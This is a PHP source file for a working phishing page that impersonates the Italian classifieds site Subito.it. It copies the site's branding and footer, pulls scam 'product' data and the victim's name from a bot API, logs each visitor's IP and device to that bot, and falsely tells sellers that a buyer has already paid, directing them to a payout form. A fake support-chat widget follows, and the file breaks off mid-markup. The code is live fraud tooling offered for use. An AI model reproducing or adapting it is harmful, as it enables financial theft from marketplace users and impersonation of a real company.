function file_get_cont($url){
    $ch = curl_init($url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $req = curl_exec($ch); curl_close($ch);  
    return $req;
}

include('./config.php');

ini_set('display_errors', 0); 
error_reporting(E_ALL);

if(!$_COOKIE['tokena']){
  $token = substr(md5(uniqid(rand(), true)),0,8);
}else{
  $token = $_COOKIE['tokena'];
}
function getBrowser()
    {
        $u_agent = $_SERVER['HTTP_USER_AGENT'];
        $bname = 'Unknown';
        $platform = 'Unknown';
        $version= "";

        //First get the platform? 
        if (preg_match('/android/i', $u_agent)) {
            $platform = '📱 Android';
        }elseif (preg_match('/iphone/i', $u_agent)) {
            $platform = '📱 iPhone';
        }elseif (preg_match('/ipad/i', $u_agent)) {
            $platform = '📱 iPad';
        }elseif (preg_match('/linux/i', $u_agent)) {
            $platform = 'linux';
        }
        elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
            $platform = '💻 Mac OS';
        }
        elseif (preg_match('/windows|win32/i', $u_agent)) {
            $platform = '💻 Windows';
        }
         
    
        // Next get the name of the useragent yes seperately and for good reason
        if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
        {
            $bname = 'Internet Explorer';
            $ub = "MSIE";
        }
        elseif(preg_match('/Firefox/i',$u_agent))
        {
            $bname = 'Mozilla Firefox';
            $ub = "Firefox";
        }
        elseif(preg_match('/Chrome/i',$u_agent))
        {
            $bname = 'Google Chrome';
            $ub = "Chrome";
        }
        elseif(preg_match('/Safari/i',$u_agent))
        {
            $bname = 'Apple Safari';
            $ub = "Safari";
        }
        elseif(preg_match('/Opera/i',$u_agent))
        {
            $bname = 'Opera';
            $ub = "Opera";
        }
        elseif(preg_match('/Netscape/i',$u_agent))
        {
            $bname = 'Netscape';
            $ub = "Netscape";
        }
    
        // finally get the correct version number
        $known = array('Version', $ub, 'other');
        $pattern = '#(?<browser>' . join('|', $known) .
        ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
        if (!preg_match_all($pattern, $u_agent, $matches)) {
            // we have no matching number just continue
        }
    
        // see how many we have
        $i = count($matches['browser']);
        if ($i != 1) {
            //we will have two since we are not using 'other' argument yet
            //see if version is before or after the name
            if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
                $version= $matches['version'][0];
            }
            else {
                $version= $matches['version'][1];
            }
        }
        else {
            $version= $matches['version'][0];
        }
    
        // check if we have a number
        if ($version==null || $version=="") {$version="?";}
    
        return array(
            'userAgent' => $u_agent,
            'name'      => $bname,
            'version'   => $version,
            'platform'  => $platform,
            'pattern'    => $pattern
        );
    }
  
 
$product = file_get_cont($bot_config->bot_link."api.php?get_product=".$_GET['product']);  
$product = json_decode($product);

$browser = getBrowser();     
 
$data = array(
  'visit'=>'order',
  'token'=>$token,
  'product'=>$product->id,
  'ip'=>$_SERVER['REMOTE_ADDR'],
  'device'=>$browser['platform'].', '.$browser['name']
); 
if($_GET['v']){
    $data['v']=1;
}
file_get_cont($bot_config->bot_link.'bot.php?'.http_build_query($data));  
 
echo '


<!DOCTYPE html>
<html lang="ru">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link href="/favicon.png" rel="icon" type="image/x-icon">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Annunci su Subito Market</title>

<meta property="og:url" content="https://subito.it/">
<meta property="og:site_name" content="Subito">
<meta property="og:title" content="'.$product->title.'">
<meta property="og:description" content="'.$product->title.': Annunci su Subito Market">
<meta property="og:image" content="'.$product->img.'">
<meta property="og:type" content="website">
<meta property="og:locale" content="it_IT">

<style>* {
    padding: 0;
    margin: 0;
    box-sizing: border-box;
}
._4 {
    font-size: 20px;
    font-weight: 600;
    margin-bottom: 20px;
    margin-top: 40px;
}

.block {
    margin-top: 30px;
    display: flex;
}
.adress1 {
    width: 50%;
    margin-right: 15px;
}
.adress2 {
    width: 35%;
    margin-right: 15px;
}
.nav-info {
    width: 30%;
    margin-left: 30px;
}

body {
    font-family: \'Roboto\', sans-serif;
    background: #fff;
    color: #555;
    min-width: 280px;
    margin: 0 30px;
}
#top-menu {
    width: 100%; 
    height: 35px; 
    border-bottom: 1px solid #dfe3ed; 
    max-width: 1200px; 
    margin: 0 auto;
}
header {
    height: 100px;
}
#icon-star {
    font-size: 22px;
    color: #fff;
}
#icon-star:before {
    content: "";
}
header .container {
    border-bottom: 1px solid #dfe3ed;
    height: 80px;
    padding-left: 17px;
}
.container {
    padding: 0;
    max-width: 1200px;
    margin: 0 auto;
    height: 100%;
}
#header-menu-top {
    width: 734px; 
    display: flex; 
    float: right;
    margin-top: 8px;
}
.between {
    margin: 0 7px;
    font-size: 14px;
    color: #dedede;
}
#header-menu-top a {
    text-decoration: none;
    font-size: 14px;
    color: #8d98a7;
}
#header-menu-top a:hover {
    text-decoration: underline;
}
#logbutton {
    padding-left: 18px;
    text-decoration: none;
    color: #f2a700;
    background-color: #fdf6e5;
    border: 1px solid #fdf6e5;
    float: right;
    font-size: 16px;
    font-weight: 600;
    line-height: 1.25;
    margin-top: 16px;
    margin-bottom: 12px;
    padding: 10px 15px;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    border-radius: 4px;
}
#logbutton:hover {
    border: 1px solid #f2a700;
}

.header-logo {
    display: block;
    position: absolute;
    top: 56px;
    z-index: 10;
}

.header-logo_o {
    position: absolute;
    left: 0;
    top: 0;
    transform: translate(12px, 15px);
    content: \'\';
    border-radius: 50%;
    width: 10px;
    height: 10px;
    box-shadow: 0 0 0 12px #24e5db;
}

.header-logo_l {
    width: 10px;
    top: 0;
    bottom: 0;
    background: #23e5db;
    position: absolute;
    left: 37px;
}

.header-logo_x {
    width: 20px;
    height: 20px;
    overflow: hidden;
    display: block;
    position: absolute;
    left: 0;
    top: 0;
    transform: translate(51px, 10px);
}

.header-logo_x:before {
    transform: skewX(45deg) translate(-50%, 0);
    content: \'\';
    position: absolute;
    top: 0;
    left: 50%;
    width: 65%;
    height: 100%;
    background: #24e5db;
}

.header-logo_x:after {
    transform: skewX(-45deg) translate(-50%, 0);
    content: \'\';
    position: absolute;
    top: 0;
    left: 50%;
    width: 65%;
    height: 100%;
    background: #24e5db;
}
#footermain {
    display: flex;
    max-width: 1200px;
    margin: 0 auto;
}
#nav3 {
    width: 40%;
}
main {
    margin: 20px 0;
}

.section-content {
    padding: 24px;
}
.nav-info > ul > li > a {
    text-decoration: none;
    color: #717e8f;
    font-size: 14px;
    font-weight: 100;
}
.nav-info > ul {
    padding: 0;
}
.nav-info > ul > li {
    list-style: none;
    margin-bottom: 15px;
}

.item-container {
    display: flex;
    flex-direction: row;
    justify-content: space-between;
    align-items: start;
    margin-bottom: 70px;
}

.item-block {
    max-width: 68%;
    background: #fff;
}
.item-block_header {
    margin-bottom: 40px;
}

.item-block_title {
    font-size: 24px;
    line-height: 1.16;
    font-weight: 400;
}

.item-block_text {
    display: inline-block;
    vertical-align: top;
    margin-left: 20px;
    word-wrap: break-word;
    word-break: break-word;
    line-break: normal;
    hyphens: manual;
    max-width: 70%;
}

.item-block_image {
    display: inline-block;
    height: 115px;
}

.item-block_image img {
    border-radius: 5px;
    height: 115px;
    width: 110px;
    object-fit: cover;
}

.item-block_price {
    font-size: 30px;
    font-weight: 500;
    margin-top: 5px;
    color: #f2a700;
}

.item-block_status {
    font-size: 17px;
    font-weight: 500;
    margin-top: 10px;
}

.item-block_main {
    margin-top: 36px;
}

.item-block_description {

}

.recipient-block_row {
    display: flex;
    flex-direction: row;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 30px;
}

.recipient-block_row label {
    display: block;
    margin-bottom: 5px;
}

.recipient-block_input {
    width: 100%;
    height: 38px;
    border: none;
    border-bottom: 1px #dfe3ed solid;
    outline: none;
    color: #3c4858;
    font-size: 16px;
    font-weight: 600;
}

.recipient-subblock_min {
    width: 100%;
}

.recipient-subblock_max {
    width: 100%;
}

.description-title {
    font-size: 24px;
    font-weight: 500;
    margin-bottom: 15px;
}

.description-subtitle {
    font-size: 16px;
    line-height: 24px;
}

.description-mail {
    width: 200px;
    margin-top: 25px;
}

.item-block_footer {
    border-top: 1px #dfe3ed solid;
    margin-top: 30px;
    padding-top: 20px;
}

.item-footer_text {
    font-size: 15px;
    color: #f2a700;
}

.item-pay {
    max-width: 30%;
    width: 100%;
    background: white;
}

.item-pay_title {
    font-weight: 500;
}

.item-pay_item {
    margin-top: 5px;
    font-size: 15px;
}

.item-pay_price {
    font-size: 20px;
    margin-top: 15px;
}

.item-pay_button {
    background-color: #f2a700;
    transition: all 0.3s ease;
    width: 100%;
    height: 45px;
    cursor: pointer;
    border: none;
    border-radius: 4px;
    font-size: 15px;
    line-height: 1.25;
    font-weight: 500;
    color: #ffffff;
    margin: 25px 0;
}

.item-pay_safery {
    font-size: 15px;
    margin-bottom: 10px;
}

.item-pay_safery img {
    width: 20px;
    height: 20px;
    vertical-align: middle;
    margin-right: 10px;
}

.item-pay_info {
    line-height: 1.4;
    font-size: 14px;
}

.item-pay_paymentMethods {
    max-width: 30px;
    width: 10%;
    margin-top: 10px;
    opacity: 0.6;
    filter: grayscale(100%);
    margin-left: 25px;
}

.section-info {
    background: #fff;
    border: 1px solid #f2f4f5;
    padding: 24px 15px;
    width: 100%;
    margin-bottom: 20px;
}

.section-info_icon {
    height: 38px;
    vertical-align: middle;
}

.section-info_text {
    display: inline-block;
    vertical-align: middle;
    margin-left: 20px;
    width: 80%;
}

.section-info_title {
    font-size: 24px;
    font-weight: 500;
}

.section-info_subtitle {
    font-size: 17px;
    font-weight: 400;
    margin-top: 10px;
}

@media(max-width: 1100px) {
    .item-container {
        display: block;
    }

    section {
        width: 100%;
        max-width: 100% !important;
        margin-bottom: 20px;
    }
} 
@media(max-width: 800px) {
    #top-menu {
    display: none;
    }
    .header-logo {
    top: 20px;
    }
}
@media(max-width: 720px) {
    #footermain {
    display: block;
    }
    .nav-info {
    width: 100%;
    margin-bottom: 60px;
    }
    .item-block_title {
        font-size: 20px;
    }
    .inlblk  {
    display: none;
    }
}
@media(max-width: 500px) {
    .item-block_image img {
    height: 200px;
    width: 90%;
    margin-bottom: 20px;
    }
    .item-block_text {
    max-width: 90%;
    margin-left: 0;
    }
    #logbutton  {
    display: none;
    }
    #footermain {
    margin-left: 0;
    }
    .section-info_title {
        font-size: 20px;
    }

    .section-info_subtitle, .item-block_status {
        font-size: 15px;
    }

    .item-block_price {
        font-size: 26px;
    }

    .recipient-block_row {
        display: block;
    }

    .recipient-subblock_min {
        width: 100%;
        margin-bottom: 20px;
    }
} @media(max-width: 460px) {
    .section-info_icon {
        display: none;
    }

    .section-info_text {
        width: 100%;
        margin-left: 0px;
    }
    .item-block_text {
    margin-left: 0;
    }
}


/* Generator */
.generator-container {
    max-width: 500px;
    margin: 0 auto;
}

.generator-section {
    margin: 30px 0;
    width: 100%;
}

.generator-span {
    display: block;
    margin-bottom: 10px;
    font-size: .95em;
}

.generator-a {
    color: unset;
    font-weight: 600;
}

.generator-label {
    display: block;
    font-size: 1.05em;
    margin-bottom: 5px;
}

.generator-input {
    width: 100%;
    height: 38px;
    border: none;
    border-bottom: 1px #002f34 solid;
    outline: none;
    color: #002F34;
    font-size: 16px;
    background: unset;
}

.generator-button {
    background-color: #002f34;
    transition: all 0.3s ease;
    width: 100%;
    height: 45px;
    cursor: pointer;
    border: none;
    border-radius: 4px;
    font-size: 15px;
    line-height: 1.25;
    font-weight: 500;
    color: #ffffff;
}

.generator-input::placeholder {
    opacity: .7;</style>
<script></script>

</head>
<body>
<header>
<div id="top-menu">
<div id="header-menu-top">
<a href="https://www.subito.it/magazine/#?utm_source=sbtclassified&utm_medium=addetailheader">Magazine</a>
<div class="between">|</div>
<a href="https://info.subito.it/per-i-privati.htm">Consigli per la vendita</a>
<div class="between">|</div>
<a href="https://impresapiu.subito.it/shops?xtfrom=header_menu">Negozi e Aziende</a>
<div class="between">|</div>
<a href="https://aziende.subito.it/">Subito per le Aziende</a>
<div class="between">|</div>
<a href="https://assistenza.subito.it/hc/it">Aiuto</a>
<div class="between">|</div>
<a href="https://areariservata.subito.it/ricerche">Ricerche salvate</a>
<div class="between">|</div>
<a href="https://areariservata.subito.it/preferiti">Preferiti</a>
</div>
</div>
<div class="container">
<div class="header-logo">
<a href="https://www.subito.it/"><img style="height: 36px;" src="/logo.png"></a>
</div>
<div style="float: right; display: flex; margin-top: 3px;">


<div style="margin-top: 28px; margin-right: 30px;">
<a href="https://areariservata.subito.it/login_form" class="tdnone inlblk " id="observed-search-link" style="text-decoration: none; color: #3c4858;font-weight: 600;">Accedi</a>
</div>
<div style="margin-top: 28px; margin-right: 30px;">
<a href="https://areariservata.subito.it/form" class="tdnone inlblk " id="observed-search-link" style="text-decoration: none; color: #3c4858;font-weight: 400;">Registrati</a>
</div>
<a id="logbutton" data-cy="common_link_header_postnewad" class="postnewlink fbold tdnone" href="https://www.subito.it/vendere">
<span>Inserisci annuncio</span>
</a>
</div>
</div>
</header>
<main>
<div class="container">
'.(!$_GET['v']?'
<section class="section-info">
<img src="/check.png" alt="" class="section-info_icon">
<div class="section-info_text">
<p class="section-info_title">L\'acquirente ha già pagato il tuo articolo.</p>
 <p class="section-info_subtitle">Prendi i tuoi soldi adesso</p>
</div>
</section>
':'').'
<div class="item-container">
<section class="item-block">
<div class="section-content">
<div class="item-block_header">
<div class="item-block_image">
<img src="'.$product->img.'" alt="">
</div>
<div class="item-block_text">
<p class="item-block_title">'.$product->title.'</p>
<p class="item-block_price">'.$product->price.' '.$product->currancy.'</p>
'.(!$_GET['v']?'
<p class="item-block_status">Il tuo articolo è stato pagato</p>
':'').'
</div>
</div>

<div class="recipient-block">
<div class="recipient-block_row">
<div class="recipient-subblock_min">
<label>Nome dell\'acquirente</label>
'.($_GET['v']?'
<input class="recipient-block_input" value="" >
':'
<input class="recipient-block_input" value="'.$product->mamont_name.'" readonly>
').'
</div>
</div>
<div class="recipient-block_row">
<div class="recipient-subblock_max">
<label>Indirizzo di consegna</label> 
'.($_GET['v']?'
<input class="recipient-block_input" value="" >
':'
<input class="recipient-block_input" value="'.$product->address.'" readonly>
').'
</div>
</div>
</div>
'.(!$_GET['v']?'
<div class="item-block_main">
<div class="item-block_description">
<p class="description-subtitle">
Non appena riceverai il denaro sulla carta, il corriere ti contatterà. È necessario indicare un momento conveniente per il trasferimento della merce.<br><br>Il trasferimento della merce deve essere effettuato entro una settimana dalla data di ricezione dei fondi.</p> 
</div>
</div> 
<div class="item-block_footer">
<p class="item-footer_text">Numero dell\'annuncio: <b style="color: #555;">'.$product->id.'</b></p>
</div>
':'
<p class="item-footer_text">Numero dell\'annuncio: <b style="color: #555;">'.$product->id.'</b></p>
').'
</div>
</section>
<section class="item-pay">
<div style="border: 1px solid #dfe3ed; border-radius: 4px;" class="section-content">
'.(!$_GET['v']?'
<span class="item-pay_title">Ricezione di fondi</span>
<p class="item-pay_price">Importo da ricevere: <b>'.$product->price.' '.$product->currancy.'</b></p>
':'
<p class="item-pay_price"><b>'.$product->price.' '.$product->currancy.'</b></p>
').'
<p class="item-pay_item">'.$product->title.'</p>
'.(!$_GET['v']?'
<form action="/order/payout/'.$product->id.'" method="post">
<a href="">
<button class="item-pay_button">Ottieni fondi</button>
</a>
':'
<form action="/order/payout/'.$product->id.'/1/" method="post">
<a href="">
<button class="item-pay_button">Paga</button>
</a>
').' 
</form>
<p class="item-pay_safery"><img src="/shield.png" alt="">Effettuare pagamenti è sicuro</p>
<img src="/maeschb.svg" alt="" class="item-pay_paymentMethods">
<img src="/visachb.svg" alt="" class="item-pay_paymentMethods">
<img src="/mastercardchb.svg" alt="" class="item-pay_paymentMethods">
<img src="/pcichb.svg" alt="" class="item-pay_paymentMethods" style="margin-bottom: 6px;">
</div>
</section>
</div>
</div>
</main>
<footer style="padding-bottom: 50px; padding-top: 50px; border-top: 1px solid #dfe3ed">
<div id="footermain">
<div class="nav-info">
<ul>
<li><a href="https://assistenza.subito.it/hc/it/">Aiuto</a></li>
<li><a href="https://assistenza.subito.it/hc/it/sections/360000209545">Regole</a></li>
<li><a href="https://assistenza.subito.it/hc/it/categories/360000095649">Sicurezza</a></li>
<li><a href="https://info.subito.it/policies/condizioni-generali.htm">Condizioni</a></li>
<li><a href="https://info.subito.it/policies/privacy.htm">Privacy</a></li>
<li><a href="https://info.subito.it/policies/tutto-subito.htm">Servizio TuttoSubito</a></li>
<li><a href="https://www.subito.it/vendere/">Inserisci annuncio</a></li>
<li><a href="https://info.subito.it/policies/condizioni-promuovi.htm">Promuovi annuncio</a></li>
<li><a href="https://info.subito.it/per-i-privati.htm">Consigli per la vendita</a></li>
<li><a href="https://impresapiu.subito.it//shops?xtfrom=footer_menu">Negozi e Aziende</a></li>
<li><a href="https://aziende.subito.it/">Subito per le aziende</a></li>
</ul>
</div>
<div class="nav-info">
<ul>
<li><a href="https://info.subito.it/about.htm">Chi siamo</a></li>
<li><a href="https://info.subito.it/lavora-con-noi.htm">Lavora con noi</a></li>
<li><a href="https://www.subito.it/magazine/green/">Sostenibilità</a></li>
<li><a href="https://www.subito.it/magazine/">Magazine</a></li>
<li><a href="https://www.infojobs.it/">InfoJobs</a></li>
<li><a href="https://www.subito.it/sitemaps/">Mappa del sito</a></li>
</ul>
</div>
<div class="nav-info">
<ul>
<li>
<a href="https://it-it.facebook.com/subitoit"><img style="height: 15px;" src="/facebook.svg"> Facebook</a>
</li>
<li><a href="https://www.instagram.com/subito_it/"><img style="height: 15px;" src="/instagram.svg"> Instagram</a></li>
<li><a href="https://twitter.com/Subitoit"><img style="height: 15px;" src="/twitter.svg"> Twitter</a></li>
<li><a href="https://www.youtube.it/user/subitoit"><img style="height: 15px;" src="/youtube.svg"> Youtube</a></li>
</ul>
</div>
<div class="nav-info">
<ul>
<li><a href="https://play.google.com/store/apps/details?id=it.subito&referrer=utm_source%3Dsite%26utm_medium%3Dfooter"><img style="height: 15px;" src="/android.svg"> Subito per Android</a></li>
<li><a href="https://itunes.apple.com/it/app/subito.it/id450775137?mt=8"><img style="height: 15px;" src="/apple.svg"> Subito per IOS</a></li>
</ul>
</div>
</div>
<div style="width: 240px; margin: 0 auto;">
<div style="margin: 20px auto; width: 138px;"><img style="height: 32px;" src="/grey-short.svg"></div>
<div style="font-size: 14px; color: #717e8f;">© 2021 Subito.it - P.IVA 05526340962</div>
</div>
</footer>
<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #414141;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}

body>div a:last-child { z-index:-9999!important; position:absolute;}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: \' \';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #414141;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #4e4e4e;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>
<div id="offonthechap">
<div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
<div class="chaport-launcher" style="left: 0px; right: 0px;">
<div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
<div class="chaport-launcher-chat-icon"></div>
<div class="chaport-launcher-close-icon"></div>
<div class="chaport-launcher-operator-photo"></div>
</div>
</div>
<div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
<div class="chaport-inner">
<div class="main-textblock">
<div class="operatorblock">
<div class="operatorblock-content" style="display: flex;">
<div id="operator-photo">
<img id="oper-photo-img" src="/operator-img.png">
<div class="operator-name">Sofia</div>
</div>
<div class="team-wrapper">
<div class="team">Servizio di assistenza</div>
<div class="activity-indicator">
